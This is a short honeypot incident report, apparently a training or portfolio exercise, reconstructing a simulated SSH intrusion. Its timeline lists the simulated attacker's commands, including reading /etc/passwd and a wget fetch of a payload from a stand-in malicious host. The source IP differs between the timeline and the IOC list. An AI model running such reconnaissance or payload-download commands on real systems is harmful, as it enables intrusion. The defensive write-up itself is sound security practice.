## Summary
A synthetic SSH-based attack was simulated against a cowrie honeypot to demonstrate incident investigation workflow. The attacker connected via SSH, authenticated successfully using weak credentials (root/toor), performed basic reconnaissance (whoami, uname -a, ls /, cat /etc/passwd), then attempted to download a remote payload via wget before disconnecting.


## Timeline
- 09:50:41 SSH connection established from 127.0.0.1
- 09:50:48 Login succeeded as root/toor
- 09:52:12 Command executed: whoami
- 09:52:20 Command executed: uname -a
- 09:53:15 Command executed: ls /
- 09:54:10 Command executed: cat /etc/passwd
- 09:54:37 Command executed: wget http://malicious-site.com/payload.sh
- 09:54:53 Session closed / attacker disconnected

## Indicators of Compromise (IOCs)
- Source IP: 192.168.56.1
- Malicious URL: http://malicious-site.com/payload.sh
- Payload SHA-256: 183e4b9b791f0bfbe18196f47c9081d0fe223f525b5970bfaa73479ad1d441eb



 
## Skills Demonstrated
- Log analysis and timeline reconstruction from honeypot session data
- Identification and documentation of Indicators Of Compromise (IOCs)
- Incident investigation workflow (detection -> analysis -> documentation)
- Technical writing for security incident reporting 
